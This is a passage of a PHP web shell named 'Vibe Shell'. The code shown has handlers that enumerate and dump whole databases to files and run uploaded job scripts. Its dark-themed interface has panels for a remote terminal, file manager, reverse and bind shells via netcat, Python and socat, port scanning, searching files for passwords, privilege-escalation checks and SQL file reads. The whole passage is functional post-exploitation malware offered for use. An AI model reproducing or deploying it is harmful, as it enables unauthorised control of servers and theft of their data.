                    while ($row = pg_fetch_assoc($result)) {
                        $results[] = $row;
                    }
                    break;

                case 'privileges':
                    $result = pg_query($conn, "SELECT table_schema, table_name, privilege_type FROM information_schema.role_table_grants WHERE grantee = current_user");
                    while ($row = pg_fetch_assoc($result)) {
                        $results[] = $row;
                    }
                    break;

                case 'columns':
                    $result = pg_query($conn, "SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema = 'public' ORDER BY table_name, ordinal_position");
                    while ($row = pg_fetch_assoc($result)) {
                        $results[] = $row;
                    }
                    break;

                case 'version':
                    $result = pg_query($conn, "SELECT version() as version, current_user as user, current_database() as database");
                    $results = pg_fetch_assoc($result);
                    break;
            }

            pg_close($conn);

        } elseif ($conn_info['type'] === 'sqlite') {
            $conn = new SQLite3($conn_info['db']);

            switch ($enumType) {
                case 'databases':
                    // SQLite has only one database per file, show tables instead
                    $result = $conn->query("SELECT name FROM sqlite_master WHERE type='table'");
                    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                        $results[] = $row;
                    }
                    break;

                case 'tables':
                    $result = $conn->query("SELECT name FROM sqlite_master WHERE type='table'");
                    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                        $results[] = $row;
                    }
                    break;

                case 'columns':
                    // Get all tables first, then get columns for each
                    $tablesResult = $conn->query("SELECT name FROM sqlite_master WHERE type='table'");
                    while ($table = $tablesResult->fetchArray(SQLITE3_ASSOC)) {
                        $tableName = $table['name'];
                        $columnsResult = $conn->query("PRAGMA table_info($tableName)");
                        while ($col = $columnsResult->fetchArray(SQLITE3_ASSOC)) {
                            $results[] = [
                                'table_name' => $tableName,
                                'column_name' => $col['name'],
                                'data_type' => $col['type']
                            ];
                        }
                    }
                    break;

                case 'version':
                    $result = $conn->query("SELECT sqlite_version() as version");
                    $results = $result->fetchArray(SQLITE3_ASSOC);
                    break;
            }

            $conn->close();
        }

        echo json_encode(['success' => true, 'data' => $results]);

    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
}

function handleSqlDumpDb() {
    if (!isset($_SESSION['sql_conn'])) {
        echo json_encode(['error' => 'Not connected to database']);
        return;
    }

    $database = $_POST['database'] ?? '';
    $conn_info = $_SESSION['sql_conn'];

    if (empty($database)) {
        echo json_encode(['error' => 'No database specified']);
        return;
    }

    try {
        if ($conn_info['type'] === 'mysql') {
            $conn = @mysqli_connect(
                $conn_info['host'],
                $conn_info['user'],
                $conn_info['pass'],
                $database,
                $conn_info['port']
            );

            if (!$conn) {
                echo json_encode(['error' => 'Failed to connect to database']);
                return;
            }

            $dump = "-- Database: $database\n\n";

            // Get all tables
            $result = mysqli_query($conn, "SHOW TABLES");
            $tables = [];
            while ($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
                $tables[] = $row[0];
            }

            foreach ($tables as $table) {
                $dump .= "\n-- Table: $table\n";

                // Get CREATE TABLE
                $result = mysqli_query($conn, "SHOW CREATE TABLE `$table`");
                $row = mysqli_fetch_assoc($result);
                $dump .= $row['Create Table'] . ";\n\n";

                // Get data
                $result = mysqli_query($conn, "SELECT * FROM `$table`");
                while ($row = mysqli_fetch_assoc($result)) {
                    $values = array_map(function($v) use ($conn) {
                        return is_null($v) ? 'NULL' : "'" . mysqli_real_escape_string($conn, $v) . "'";
                    }, array_values($row));

                    $dump .= "INSERT INTO `$table` VALUES (" . implode(', ', $values) . ");\n";
                }
                $dump .= "\n";
            }

            mysqli_close($conn);

            // Save to file
            $filename = STORAGE_DIR . '/dump_' . $database . '_' . time() . '.sql';
            file_put_contents($filename, $dump);

            echo json_encode([
                'success' => true,
                'file' => $filename,
                'size' => strlen($dump),
                'tables' => count($tables)
            ]);
        } else {
            echo json_encode(['error' => 'Database dump only supported for MySQL currently']);
        }

    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
}

function handleSqlDumpTable() {
    if (!isset($_SESSION['sql_conn'])) {
        echo json_encode(['error' => 'Not connected to database']);
        return;
    }

    $table = $_POST['table'] ?? '';
    $conn_info = $_SESSION['sql_conn'];

    if (empty($table)) {
        echo json_encode(['error' => 'No table specified']);
        return;
    }

    try {
        $conn = null;
        $results = [];

        if ($conn_info['type'] === 'mysql') {
            $conn = @mysqli_connect(
                $conn_info['host'],
                $conn_info['user'],
                $conn_info['pass'],
                $conn_info['db'],
                $conn_info['port']
            );

            if (!$conn) {
                echo json_encode(['error' => 'Failed to reconnect']);
                return;
            }

            $result = mysqli_query($conn, "SELECT * FROM `$table`");
            if ($result) {
                while ($row = mysqli_fetch_assoc($result)) {
                    $results[] = $row;
                }
                mysqli_free_result($result);
            }

            mysqli_close($conn);

        } elseif ($conn_info['type'] === 'pgsql') {
            $connStr = sprintf(
                "host=%s port=%s dbname=%s user=%s password=%s",
                $conn_info['host'],
                $conn_info['port'],
                $conn_info['db'],
                $conn_info['user'],
                $conn_info['pass']
            );

            $conn = @pg_connect($connStr);
            $result = pg_query($conn, "SELECT * FROM \"$table\"");

            if ($result) {
                while ($row = pg_fetch_assoc($result)) {
                    $results[] = $row;
                }
            }

            pg_close($conn);

        } elseif ($conn_info['type'] === 'sqlite') {
            $conn = new SQLite3($conn_info['db']);
            $result = $conn->query("SELECT * FROM \"$table\"");

            while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $results[] = $row;
            }

            $conn->close();
        }

        echo json_encode([
            'success' => true,
            'rows' => count($results),
            'data' => $results
        ]);

    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
}

// === UTILITIES ===
function createJob($jobId, $name, $script) {
    $scriptPath = SCRIPTS_DIR . '/' . $jobId . '.sh';
    $outputPath = JOBS_DIR . '/' . $jobId . '.output';
    $metaPath = JOBS_DIR . '/' . $jobId . '.meta';

    file_put_contents($scriptPath, $script);
    @chmod($scriptPath, 0755);

    $meta = [
        'id' => $jobId,
        'name' => $name,
        'status' => 'pending',
        'created' => time(),
        'script_path' => $scriptPath,
        'output_path' => $outputPath,
    ];

    file_put_contents($metaPath, json_encode($meta));
}

function isProcessRunning($pid) {
    if (!$pid) return false;
    return @file_exists("/proc/$pid");
}

function resolvePath($path, $cwd) {
    if ($path[0] === '/') return $path;
    if ($path === '~') return $_SERVER['HOME'] ?? '/root';
    return $cwd . '/' . $path;
}

function addHistory($cmd) {
    $_SESSION['history'][] = [
        'cmd' => $cmd,
        'time' => time(),
        'cwd' => $_SESSION['cwd']
    ];

    if (count($_SESSION['history']) > HISTORY_LIMIT) {
        array_shift($_SESSION['history']);
    }
}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / (1024 ** $pow), 2) . ' ' . $units[$pow];
}

// === UI ===
function serveUI() {
    header('Content-Type: text/html');
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vibe Shell</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    background: #0d1117;
    color: #c9d1d9;
    height: 100vh;
    overflow: hidden;
}

.container {
    display: grid;
    grid-template-columns: 220px 1fr;
    grid-template-rows: 45px 1fr 30px;
    height: 100vh;
}

.header {
    grid-column: 1 / -1;
    background: #161b22;
    border-bottom: 1px solid #30363d;
    display: flex;
    align-items: center;
    padding: 0 20px;
    gap: 15px;
}

.header h1 {
    font-size: 18px;
    color: #58a6ff;
    letter-spacing: 2px;
}

.header .info {
    font-size: 11px;
    color: #8b949e;
}

.sidebar {
    background: #0d1117;
    border-right: 1px solid #30363d;
    padding: 15px 10px;
    overflow-y: auto;
}

.nav-section {
    margin-bottom: 20px;
}

.nav-title {
    font-size: 11px;
    color: #8b949e;
    text-transform: uppercase;
    margin-bottom: 8px;
    letter-spacing: 1px;
}

.nav-item {
    padding: 8px 12px;
    margin: 3px 0;
    cursor: pointer;
    border-radius: 6px;
    font-size: 13px;
    transition: all 0.2s;
    border: 1px solid transparent;
}

.nav-item:hover {
    background: #161b22;
    border-color: #30363d;
}

.nav-item.active {
    background: #1f6feb;
    color: white;
}

.main {
    background: #0d1117;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

.view {
    display: none;
    flex-direction: column;
    height: 100%;
    padding: 15px;
    overflow: hidden;
}

.view.active {
    display: flex;
}

.terminal {
    flex: 1;
    background: #010409;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 15px;
    overflow-y: auto;
    font-size: 13px;
    line-height: 1.6;
    margin-bottom: 10px;
}

.terminal-line {
    white-space: pre-wrap;
    word-break: break-all;
}

.terminal-prompt {
    color: #58a6ff;
}

.terminal-output {
    color: #c9d1d9;
}

.terminal-error {
    color: #f85149;
}

.cmd-input {
    display: flex;
    gap: 8px;
}

.cmd-input input {
    flex: 1;
    background: #161b22;
    border: 1px solid #30363d;
    color: #c9d1d9;
    padding: 10px 14px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 13px;
}

.cmd-input input:focus {
    outline: none;
    border-color: #1f6feb;
}

.path-bar {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
}

.path-bar input {
    flex: 1;
    background: #161b22;
    border: 1px solid #30363d;
    color: #c9d1d9;
    padding: 8px 12px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 12px;
}

.file-list {
    flex: 1;
    background: #010409;
    border: 1px solid #30363d;
    border-radius: 6px;
    overflow-y: auto;
}

.file-item {
    display: grid;
    grid-template-columns: 30px 1fr 100px 80px 60px;
    padding: 10px 15px;
    border-bottom: 1px solid #161b22;
    transition: background 0.15s;
    font-size: 13px;
    align-items: center;
    position: relative;
}

.file-item:hover {
    background: #161b22;
}

.file-item:hover .file-actions {
    display: flex;
}

.file-item.dir {
    color: #58a6ff;
    cursor: pointer;
}

.file-icon {
    font-size: 16px;
}

.file-name {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.file-size {
    text-align: right;
    color: #8b949e;
    font-size: 11px;
}

.file-perms {
    text-align: right;
    color: #8b949e;
    font-size: 11px;
    font-family: monospace;
}

.file-actions {
    display: none;
    position: absolute;
    right: 15px;
    top: 50%;
    transform: translateY(-50%);
    gap: 5px;
    background: #0d1117;
    padding: 5px;
    border-radius: 4px;
    box-shadow: 0 0 10px rgba(0,0,0,0.5);
}

.file-actions button {
    padding: 4px 8px;
    font-size: 11px;
}

.jobs-toolbar {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
}

.job-list {
    flex: 1;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 10px;
}

.job-card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 15px;
}

.job-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
}

.job-name {
    font-weight: bold;
    color: #58a6ff;
}

.job-status {
    padding: 4px 10px;
    border-radius: 12px;
    font-size: 11px;
    font-weight: bold;
    text-transform: uppercase;
}

.job-status.pending { background: #6e7681; color: #fff; }
.job-status.running { background: #1f6feb; color: #fff; }
.job-status.completed { background: #238636; color: #fff; }
.job-status.stopped { background: #da3633; color: #fff; }

.job-actions {
    display: flex;
    gap: 5px;
    margin-top: 10px;
}

.job-output-preview {
    background: #010409;
    border: 1px solid #30363d;
    padding: 10px;
    border-radius: 4px;
    max-height: 100px;
    overflow: hidden;
    font-size: 11px;
    margin-top: 10px;
    white-space: pre-wrap;
    word-break: break-all;
    position: relative;
}

.job-output-preview::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 30px;
    background: linear-gradient(transparent, #010409);
}

button, .btn {
    background: #238636;
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    font-family: inherit;
    font-size: 13px;
    font-weight: 500;
    transition: all 0.2s;
}

button:hover, .btn:hover {
    background: #2ea043;
}

button:active, .btn:active {
    transform: scale(0.98);
}

button.secondary {
    background: #21262d;
    border: 1px solid #30363d;
    color: #c9d1d9;
}

button.secondary:hover {
    background: #30363d;
}

button.danger {
    background: #da3633;
}

button.danger:hover {
    background: #e5534b;
}

button.small {
    padding: 5px 10px;
    font-size: 11px;
}

.status-bar {
    grid-column: 1 / -1;
    background: #161b22;
    border-top: 1px solid #30363d;
    padding: 0 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 11px;
    color: #8b949e;
}

.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(1, 4, 9, 0.9);
    z-index: 1000;
    align-items: center;
    justify-content: center;
}

.modal.active {
    display: flex;
}

.modal-content {
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 20px;
    min-width: 500px;
    max-width: 90vw;
    max-height: 90vh;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
}

.modal-content.fullscreen {
    min-width: 95vw;
    min-height: 95vh;
}

.modal-title {
    font-size: 16px;
    margin-bottom: 15px;
    color: #58a6ff;
    border-bottom: 1px solid #30363d;
    padding-bottom: 10px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.modal-body {
    margin-bottom: 15px;
    flex: 1;
    display: flex;
    flex-direction: column;
}

.modal-footer {
    display: flex;
    gap: 8px;
    justify-content: flex-end;
    border-top: 1px solid #30363d;
    padding-top: 15px;
}

input[type="text"],
input[type="number"],
input[type="file"],
textarea,
select {
    background: #161b22;
    border: 1px solid #30363d;
    color: #c9d1d9;
    padding: 8px 12px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 13px;
}

input:focus, textarea:focus, select:focus {
    outline: none;
    border-color: #1f6feb;
}

textarea {
    resize: vertical;
    min-height: 200px;
    font-family: 'Consolas', monospace;
}

label {
    display: block;
    margin-bottom: 5px;
    font-size: 12px;
    color: #8b949e;
}

.form-group {
    margin-bottom: 15px;
}

.form-row {
    display: flex;
    gap: 10px;
}

.form-row .form-group {
    flex: 1;
}

::-webkit-scrollbar {
    width: 10px;
    height: 10px;
}

::-webkit-scrollbar-track {
    background: #0d1117;
}

::-webkit-scrollbar-thumb {
    background: #30363d;
    border-radius: 5px;
}

::-webkit-scrollbar-thumb:hover {
    background: #484f58;
}

.revshell-grid, .tool-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 15px;
}

.tool-card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 15px;
    cursor: pointer;
    transition: all 0.2s;
}

.tool-card:hover {
    border-color: #1f6feb;
    transform: translateY(-2px);
}

.tool-title {
    font-weight: bold;
    color: #58a6ff;
    margin-bottom: 10px;
}

.tool-desc {
    font-size: 11px;
    color: #8b949e;
}

.tool-inputs {
    margin-bottom: 15px;
}

.output-viewer {
    flex: 1;
    background: #010409;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 15px;
    overflow-y: auto;
    font-size: 12px;
    white-space: pre-wrap;
    word-break: break-all;
    font-family: 'Consolas', monospace;
    line-height: 1.5;
}

.context-menu {
    position: absolute;
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 6px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
    z-index: 1000;
    min-width: 150px;
}

.context-menu-item {
    padding: 10px 15px;
    cursor: pointer;
    transition: background 0.15s;
    font-size: 13px;
}

.context-menu-item:hover {
    background: #1f6feb;
}

.context-menu-item:first-child {
    border-radius: 6px 6px 0 0;
}

.context-menu-item:last-child {
    border-radius: 0 0 6px 6px;
}

.hidden {
    display: none !important;
}

.flex-row {
    display: flex;
    gap: 8px;
}
</style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>⚡ VIBESHELL</h1>
        <div class="info" id="headerInfo">Loading...</div>
    </div>

    <div class="sidebar">
        <div class="nav-section">
            <div class="nav-title">Core</div>
            <div class="nav-item active" onclick="switchView('terminal')">💻 Terminal</div>
            <div class="nav-item" onclick="switchView('files')">📁 Files</div>
            <div class="nav-item" onclick="switchView('jobs')">⚙️ Jobs</div>
        </div>

        <div class="nav-section">
            <div class="nav-title">Shells</div>
            <div class="nav-item" onclick="switchView('revshell')">🔄 Reverse</div>
            <div class="nav-item" onclick="switchView('bindshell')">📞 Bind</div>
        </div>

        <div class="nav-section">
            <div class="nav-title">Recon</div>
            <div class="nav-item" onclick="switchView('portscan')">🔍 Port Scan</div>
            <div class="nav-item" onclick="switchView('find')">🔎 Find Files</div>
            <div class="nav-item" onclick="switchView('processes')">📊 Processes</div>
            <div class="nav-item" onclick="switchView('network')">🌐 Network</div>
        </div>

        <div class="nav-section">
            <div class="nav-title">Utils</div>
            <div class="nav-item" onclick="switchView('sql')">🗄️ SQL Client</div>
            <div class="nav-item" onclick="switchView('encoder')">🔐 Encoder</div>
            <div class="nav-item" onclick="switchView('privesc')">🔓 Privesc</div>
            <div class="nav-item" onclick="switchView('phpinfo')">ℹ️ PHP Info</div>
        </div>

        <div class="nav-section">
            <div class="nav-title">Info</div>
            <div id="cwdInfo" style="font-size: 11px; padding: 8px; background: #161b22; border-radius: 4px; word-break: break-all;"></div>
        </div>
    </div>

    <div class="main">
        <!-- Terminal -->
        <div id="terminal" class="view active">
            <div class="terminal" id="terminalOutput"></div>
            <div class="cmd-input">
                <input type="text" id="cmdInput" placeholder="Enter command..." autocomplete="off">
                <button onclick="execCmd()">Execute</button>
            </div>
        </div>

        <!-- Files -->
        <div id="files" class="view">
            <div class="path-bar">
                <input type="text" id="currentPath" placeholder="Path...">
                <button onclick="browsePath()">Go</button>
                <button onclick="showUploadModal()" class="secondary">Upload</button>
                <button onclick="showMkdirModal()" class="secondary">New Dir</button>
                <button onclick="refreshFiles()" class="secondary">Refresh</button>
            </div>
            <div class="file-list" id="fileList"></div>
        </div>

        <!-- Jobs -->
        <div id="jobs" class="view">
            <div class="jobs-toolbar">
                <input type="file" id="scriptFile" style="flex: 1;" accept=".sh,.bash,.txt">
                <input type="text" id="jobName" placeholder="Job name (optional)" style="flex: 1;">
                <button onclick="uploadJobScript()">Create Job</button>
                <button onclick="refreshJobs()" class="secondary">Refresh</button>
            </div>
            <div class="job-list" id="jobList"></div>
        </div>

        <!-- Reverse Shell -->
        <div id="revshell" class="view">
            <div style="margin-bottom: 15px;">
                <div class="flex-row">
                    <input type="text" id="revHost" placeholder="LHOST (your IP)" style="flex: 1;">
                    <input type="number" id="revPort" placeholder="LPORT" min="1" max="65535" style="flex: 1;">
                </div>
            </div>
            <div class="revshell-grid" id="revshellMethods"></div>
        </div>

        <!-- Bind Shell -->
        <div id="bindshell" class="view">
            <div style="margin-bottom: 15px;">
                <input type="number" id="bindPort" placeholder="Port to listen on" min="1" max="65535">
            </div>
            <div class="tool-grid">
                <div class="tool-card" onclick="spawnBindShell('nc')">
                    <div class="tool-title">Netcat</div>
                    <div class="tool-desc">Named pipe bind shell</div>
                </div>
                <div class="tool-card" onclick="spawnBindShell('python')">
                    <div class="tool-title">Python 2</div>
                    <div class="tool-desc">Python 2.x bind shell</div>
                </div>
                <div class="tool-card" onclick="spawnBindShell('python3')">
                    <div class="tool-title">Python 3</div>
                    <div class="tool-desc">Python 3.x bind shell</div>
                </div>
                <div class="tool-card" onclick="spawnBindShell('socat')">
                    <div class="tool-title">Socat</div>
                    <div class="tool-desc">Socat bind shell</div>
                </div>
            </div>
        </div>

        <!-- Port Scanner -->
        <div id="portscan" class="view">
            <div class="tool-inputs">
                <div class="form-group">
                    <label>Target Host/IP:</label>
                    <input type="text" id="scanTarget" placeholder="127.0.0.1">
                </div>
                <div class="form-group">
                    <label>Ports (comma-separated):</label>
                    <input type="text" id="scanPorts" value="21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443">
                </div>
                <button onclick="runPortScan()">Scan</button>
            </div>
            <div class="output-viewer" id="scanOutput">Results will appear here...</div>
        </div>

        <!-- Find Files -->
        <div id="find" class="view">
            <div class="tool-inputs">
                <div class="form-group">
                    <label>Search Path:</label>
                    <input type="text" id="findPath" value="/">
                </div>
                <div class="form-group">
                    <label>Filename Pattern:</label>
                    <input type="text" id="findName" placeholder="*.conf">
                </div>
                <div class="form-group">
                    <label>Content Pattern (grep):</label>
                    <input type="text" id="findContent" placeholder="password">
                </div>
                <button onclick="runFind()">Search (Creates Job)</button>
            </div>
            <div style="padding: 10px; background: #161b22; border-radius: 6px; margin-top: 10px;">
                <p style="font-size: 12px; color: #8b949e;">Search runs as a background job. Check the Jobs tab for results.</p>
            </div>
        </div>

        <!-- Processes -->
        <div id="processes" class="view">
            <div style="margin-bottom: 10px;">
                <button onclick="loadProcesses()">Refresh</button>
            </div>
            <div class="output-viewer" id="processOutput">Loading...</div>
        </div>

        <!-- Network -->
        <div id="network" class="view">
            <div style="margin-bottom: 10px;">
                <button onclick="loadNetworkInfo()">Refresh</button>
            </div>
            <div style="flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;">
                <div>
                    <h3 style="color: #58a6ff; margin-bottom: 10px;">Network Interfaces</h3>
                    <div class="output-viewer" id="netInterfaces" style="max-height: 200px;">Loading...</div>
                </div>
                <div>
                    <h3 style="color: #58a6ff; margin-bottom: 10px;">Routes</h3>
                    <div class="output-viewer" id="netRoutes" style="max-height: 200px;">Loading...</div>
                </div>
                <div>
                    <h3 style="color: #58a6ff; margin-bottom: 10px;">Connections</h3>
                    <div class="output-viewer" id="netConnections" style="max-height: 300px;">Loading...</div>
                </div>
            </div>
        </div>

        <!-- SQL Client -->
        <div id="sql" class="view">
            <div style="display: grid; grid-template-columns: 300px 1fr; gap: 15px; height: 100%;">
                <!-- Left Panel: Connection & Browser -->
                <div style="display: flex; flex-direction: column; gap: 10px;">
                    <!-- Connection Form -->
                    <div style="background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 15px;">
                        <h3 style="color: #58a6ff; margin-bottom: 10px; font-size: 14px;">Connection</h3>
                        <div class="form-group">
                            <label>Type:</label>
                            <select id="sqlType" onchange="updateSqlDefaults()">
                                <option value="mysql">MySQL</option>
                                <option value="pgsql">PostgreSQL</option>
                                <option value="sqlite">SQLite</option>
                            </select>
                        </div>
                        <div class="form-group" id="sqlHostGroup">
                            <label>Host:</label>
                            <input type="text" id="sqlHost" value="localhost">
                        </div>
                        <div class="form-group" id="sqlPortGroup">
                            <label>Port:</label>
                            <input type="text" id="sqlPort" placeholder="3306">
                        </div>
                        <div class="form-group" id="sqlUserGroup">
                            <label>Username:</label>
                            <input type="text" id="sqlUser" placeholder="root">
                        </div>
                        <div class="form-group" id="sqlPassGroup">
                            <label>Password:</label>
                            <input type="password" id="sqlPass">
                        </div>
                        <div class="form-group">
                            <label>Database:</label>
                            <input type="text" id="sqlDb" placeholder="mysql">
                        </div>
                        <button onclick="sqlConnect()" style="width: 100%;">Connect</button>
                        <div id="sqlConnStatus" style="margin-top: 10px; font-size: 11px; color: #8b949e;"></div>
                    </div>

                    <!-- Database Browser -->
                    <div style="flex: 1; background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 15px; overflow-y: auto;">
                        <h3 style="color: #58a6ff; margin-bottom: 10px; font-size: 14px;">Database Browser</h3>
                        <div id="sqlBrowser">
                            <p style="color: #8b949e; font-size: 12px;">Connect to browse databases</p>
                        </div>
                    </div>
                </div>

                <!-- Right Panel: Query & Results -->
                <div style="display: flex; flex-direction: column; gap: 10px;">
                    <!-- Quick Actions -->
                    <div style="background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 10px;">
                        <label style="margin-bottom: 8px; display: block;">Quick Actions:</label>
                        <div class="flex-row" style="flex-wrap: wrap;">
                            <button class="small secondary" onclick="quickQuery('version')">Version</button>
                            <button class="small secondary" onclick="quickQuery('user')">Current User</button>
                            <button class="small secondary" onclick="quickQuery('databases')">Databases</button>
                            <button class="small secondary" onclick="quickQuery('tables')">Tables</button>
                            <button class="small secondary" onclick="quickQuery('users')">DB Users</button>
                            <button class="small secondary" onclick="quickQuery('privileges')">Privileges</button>
                            <button class="small secondary" onclick="quickQuery('variables')">Variables</button>
                            <button class="small secondary" onclick="quickQuery('file_read')">File Read</button>
                        </div>
                    </div>

                    <!-- Query Editor -->
                    <div style="display: flex; flex-direction: column; gap: 8px;">
                        <div style="display: flex; gap: 8px; align-items: center;">
                            <label style="margin: 0;">Query:</label>
                            <div style="flex: 1;"></div>
                            <button class="small secondary" onclick="clearQuery()">Clear</button>
                            <button class="small" onclick="executeQuery()">Execute (Ctrl+Enter)</button>
                        </div>
                        <textarea id="sqlQuery" style="min-height: 120px; font-family: 'Consolas', monospace; font-size: 12px;" placeholder="Enter SQL query..." onkeydown="if(event.ctrlKey && event.key === 'Enter') executeQuery()"></textarea>
                    </div>

                    <!-- Results -->
                    <div style="flex: 1; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                            <label style="margin: 0;">Results:</label>
                            <div style="display: flex; gap: 5px;">
                                <button class="small secondary" onclick="exportResults('json')" id="exportBtn" style="display: none;">Export JSON</button>
                                <button class="small secondary" onclick="exportResults('csv')" id="exportCsvBtn" style="display: none;">Export CSV</button>
                                <span id="resultInfo" style="font-size: 11px; color: #8b949e;"></span>
                            </div>
                        </div>
                        <div id="sqlResults" class="output-viewer" style="flex: 1; overflow: auto;">
                            Results will appear here...
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Encoder -->
        <div id="encoder" class="view">
            <div class="tool-inputs">
                <div class="form-group">
                    <label>Text:</label>
                    <textarea id="encodeText" style="min-height: 100px;"></textarea>
                </div>
                <div class="flex-row">
                    <button onclick="encode('base64_encode')">Base64 Encode</button>
                    <button onclick="encode('base64_decode')" class="secondary">Base64 Decode</button>
                    <button onclick="encode('url_encode')">URL Encode</button>
                    <button onclick="encode('url_decode')" class="secondary">URL Decode</button>
                    <button onclick="encode('hex_encode')">Hex Encode</button>
                    <button onclick="encode('hex_decode')" class="secondary">Hex Decode</button>
                </div>
                <div class="form-group">
                    <label>Result:</label>
                    <textarea id="encodeResult" style="min-height: 100px;" readonly></textarea>
                </div>
            </div>
        </div>

        <!-- Privesc -->
        <div id="privesc" class="view">
            <div style="margin-bottom: 10px;">
                <button onclick="runPrivescCheck()">Run Checks</button>
            </div>
            <div style="flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px;" id="privescOutput">
                <p style="color: #8b949e;">Click "Run Checks" to scan for privilege escalation vectors...</p>
            </div>
        </div>

        <!-- PHP Info -->
        <div id="phpinfo" class="view">
            <div style="margin-bottom: 10px;">
                <button onclick="loadPhpInfo()">Load PHP Info</button>
            </div>
            <div class="output-viewer" id="phpinfoOutput" style="overflow: auto;">Click "Load PHP Info" to view...</div>
        </div>
    </div>

    <div class="status-bar">
        <div id="statusLeft">Ready</div>
        <div id="statusRight"></div>
    </div>
</div>

<!-- Context Menu -->
<div id="contextMenu" class="context-menu hidden">
    <div class="context-menu-item" onclick="contextAction('view')">👁️ View</div>
    <div class="context-menu-item" onclick="contextAction('edit')">✏️ Edit</div>
    <div class="context-menu-item" onclick="contextAction('download')">⬇️ Download</div>
    <div class="context-menu-item" onclick="contextAction('chmod')">🔐 Chmod</div>
    <div class="context-menu-item" onclick="contextAction('delete')">🗑️ Delete</div>
</div>

<!-- Modals -->
<div id="uploadModal" class="modal">
    <div class="modal-content">
        <div class="modal-title">Upload File</div>
        <div class="modal-body">
            <div class="form-group">
                <label>Select file:</label>
                <input type="file" id="uploadFile">
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="performUpload()">Upload</button>
            <button onclick="closeModal('uploadModal')" class="secondary">Cancel</button>
        </div>
    </div>
</div>

<div id="mkdirModal" class="modal">
    <div class="modal-content">
        <div class="modal-title">Create Directory</div>
        <div class="modal-body">
            <div class="form-group">
                <label>Directory path:</label>
                <input type="text" id="mkdirPath">
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="performMkdir()">Create</button>
            <button onclick="closeModal('mkdirModal')" class="secondary">Cancel</button>
        </div>
    </div>
</div>

<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-title">Change Permissions</div>
        <div class="modal-body">
            <div class="form-group">
                <label>File: <span id="chmodFilename"></span></label>
            </div>
            <div class="form-group">
                <label>Permissions (octal):</label>
                <input type="text" id="chmodMode" placeholder="0755">
            </div>
        </div>
        <div class="modal-footer">
            <button onclick="performChmod()">Change</button>
            <button onclick="closeModal('chmodModal')" class="secondary">Cancel</button>
        </div>
    </div>
</div>

<div id="editorModal" class="modal">
    <div class="modal-content" style="min-width: 700px;">
        <div class="modal-title">
            <span id="editorTitle">Editor</span>
        </div>
        <div class="modal-body">
            <textarea id="editorContent" style="width: 100%; min-height: 400px; flex: 1;"></textarea>
        </div>
        <div class="modal-footer">
            <button onclick="saveFileContent()">Save</button>
            <button onclick="closeModal('editorModal')" class="secondary">Close</button>
        </div>
    </div>
</div>

<div id="jobOutputModal" class="modal">
    <div class="modal-content fullscreen">
        <div class="modal-title">
            <span>Job Output: <span id="jobOutputName"></span></span>
            <div style="display: flex; gap: 8px;">
                <button class="small secondary" onclick="downloadJobOutput()">⬇️ Download</button>
                <button class="small secondary" id="autoRefreshBtn" onclick="toggleAutoRefresh()">🔄 Auto-refresh OFF</button>
            </div>
        </div>
        <div class="modal-body">
            <div class="output-viewer" id="jobOutputContent" style="flex: 1;">Loading...</div>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('jobOutputModal')" class="secondary">Close</button>
        </div>
    </div>
</div>

<script>
const API = '?action=';
let sysInfo = {};
let currentPath = '/';
let historyIndex = -1;
let commandHistory = [];
let currentFile = null;
let currentJobId = null;
let autoRefreshInterval = null;

(async function init() {
    await loadSysInfo();
    setupTerminalInput();
